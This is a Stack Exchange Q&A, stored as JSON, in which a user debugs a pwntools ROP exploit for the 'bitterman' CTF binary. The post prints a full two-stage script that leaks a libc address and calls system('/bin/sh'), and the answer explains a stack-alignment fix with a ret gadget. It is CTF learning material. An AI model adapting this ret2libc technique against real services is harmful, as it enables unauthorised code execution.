{
    "title": "Receiving \"Got EOF while reading in interactive\" after properly executing system(\"/bin/sh\") using pwntools",
    "link": "https://reverseengineering.stackexchange.com/questions/21524/receiving-got-eof-while-reading-in-interactive-after-properly-executing-system",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I've followed some tutorials on writing a <code>pwntools</code>-based exploit for the bitterman ELF binary, used in a CTF competition. However, all my attempts fail with the message below, i.e. <code>Got EOF while reading in interactive</code> after having executed <code>system(\"/bin/sh\")</code> using a simple ROP chain:</p>\n<pre><code>nlykkei@ubuntu-dev:~$ python bitterman.py                                                │ 27 p.recvuntil('Thanks!\\n')\n[+] Starting local process './bitterman': pid 6244                                       │ 28 \n[+] puts@glibc: 0x7fcbdc453010                                                           │ 29 #puts_addr = p.recv()[:8].strip().ljust(8,\"\\x00\")\n[+] offset: 0x7fcbdc3d2000                                                               │ 30 puts_addr = p.recvuntil('\\n', timeout=60)[:-1].strip().ljust(8,\"\\x00\")\n[*] Switching to interactive mode                                                        │ 31 log.success('puts@glibc: {}'.format(hex(u64(puts_addr))))\n[*] Got EOF while reading in interactive                                                 │ 32 \n$                                                                                        │ 33 #Stage 2\n[*] Process './bitterman' stopped with exit code -11 (SIGSEGV) (pid 6244)                │ 34 libc_puts = 0x81010\n[*] Got EOF while sending in interactive \n</code></pre>\n<p>Having traced the exploit using GDB, I can verify that <code>system(\"/bin/sh\")</code> gets executed with the <code>clone</code> syscall returning a valid child PID. However, after the <code>clone</code> syscall nothing really happens, and the parent process continue and crashes (bad return address).</p>\n<p>What could be the problem? I'd be grateful if any experienced exploit developer or CTF entusiast could spot the error.</p>\n<p><strong>Update:</strong>\nI just rewrote the exploit to use <code>execv</code> front-end for <code>execve</code> syscall, and then everything works as expected! (a shell is spawned)</p>\n<p><code>system(..)</code> works by forking a child using <code>clone</code> syscall, whereas <code>execve</code> replaces the entire process. Any idea why <code>system(..)</code> approach doesn't work?</p>\n<p><a href=\"https://github.com/ctfs/write-ups-2015/blob/master/camp-ctf-2015/pwn/bitterman-300/bitterman\" rel=\"nofollow noreferrer\">https://github.com/ctfs/write-ups-2015/blob/master/camp-ctf-2015/pwn/bitterman-300/bitterman</a></p>\n<p><a href=\"https://www.youtube.com/watch?v=6S4A2nhHdWg\" rel=\"nofollow noreferrer\">https://www.youtube.com/watch?v=6S4A2nhHdWg</a></p>\n<pre><code>from pwn import *\n\n#context(terminal=['tmux', 'new-window'])\n\np = process('./bitterman')\n#p = gdb.debug('./bitterman', 'b main')\n\n#context(os='linux', arch='amd64')\n#context.log_level = 'DEBUG'\n\n# Stage 1\nmain = p64(0x4006ec) #0x400550\nplt_puts = p64(0x400520)\ngot_puts = p64(0x600c50)\npop_rdi = p64(0x400853)\n\njunk = 152*\"A\"\n\npayload = junk + pop_rdi + got_puts + plt_puts + main\n\np.recvuntil('name?')\np.sendline('nlykkei')\np.recvuntil('message:')\np.sendline('256')\np.recvuntil('text:')\np.sendline(payload)\np.recvuntil('Thanks!\\n')\n\n#puts_addr = p.recv()[:8].strip().ljust(8,\"\\x00\")\nputs_addr = p.recvuntil('\\n', timeout=60)[:-1].strip().ljust(8,\"\\x00\")\nlog.success('puts@glibc: {}'.format(hex(u64(puts_addr))))\n\n#Stage 2\nlibc_puts = 0x81010\nlibc_system = 0x50300\nlibc_sh = 0x1aae80\n\noffset = u64(puts_addr) - libc_puts\nlog.success('offset: {}'.format(hex(offset)))\n\nsystem_addr = p64(libc_system + offset)\nsh_addr = p64(libc_sh + offset)\n\npayload = junk + pop_rdi + sh_addr + system_addr\n\np.recvuntil('name?')\np.sendline('nlykkei')\np.recvuntil('message:')\np.sendline('256')\np.recvuntil('text:')\np.sendline(payload)\np.recvuntil('Thanks!')\n\np.clean()\np.interactive() \n</code></pre>\n</div>",
    "votes": "3",
    "answers": 1,
    "views": "16k",
    "tags": [
        "exploit",
        "x86-64",
        "pwntools"
    ],
    "user": "Shuzheng",
    "time": "Jun 21, 2019 at 7:22",
    "comments": [
        {
            "user": "Stefan Chonov",
            "text": "<span class=\"comment-copy\">Did you find some solution of your problem? I asking because I have the same issue.</span>",
            "time": null
        },
        {
            "user": "Shuzheng",
            "text": "<span class=\"comment-copy\">Yes, I used <code>exec</code> instead of <code>system</code>.</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I think you might have an alignment problem. Find the address of a ret-only gadget and try putting it in your second payload as follows:</p>\n<pre><code>ret = p64(0x?????)\npayload = junk + ret + pop_rdi + sh_addr + system_addr\n</code></pre>\n<p>References:</p>\n<ol>\n<li><a href=\"https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/\" rel=\"nofollow noreferrer\">https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/</a></li>\n<li><a href=\"https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul\">https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul</a></li>\n<li><a href=\"https://stackoverflow.com/questions/49391001/why-does-the-x86-64-amd64-system-v-abi-mandate-a-16-byte-stack-alignment\">https://stackoverflow.com/questions/49391001/why-does-the-x86-64-amd64-system-v-abi-mandate-a-16-byte-stack-alignment</a></li>\n</ol>\n</div>",
            "votes": "3",
            "user": "1chk0v",
            "time": "Mar 12, 2021 at 22:50",
            "is_accepted": false,
            "comments": [
                {
                    "user": "Shuzheng",
                    "text": "<span class=\"comment-copy\">Do you have any idea why it works with <code>exec</code> and not <code>system</code>?</span>",
                    "time": null
                },
                {
                    "user": "1chk0v",
                    "text": "<span class=\"comment-copy\">Check this out: <a href=\"https://ropemporium.com/guide.html#Common%20pitfalls\" rel=\"nofollow noreferrer\">ropemporium.com/guide.html#Common%20pitfalls</a> It seems that system uses movaps instruction that is picky about alignment. Exec might not have this issue.</span>",
                    "time": null
                },
                {
                    "user": "Shuzheng",
                    "text": "<span class=\"comment-copy\">Thanks. Just off-topic: Is ROP still viable given code is compiled with CFI? Or is it like studying stack execution (no DEP)?</span>",
                    "time": null
                }
            ]
        }
    ]
}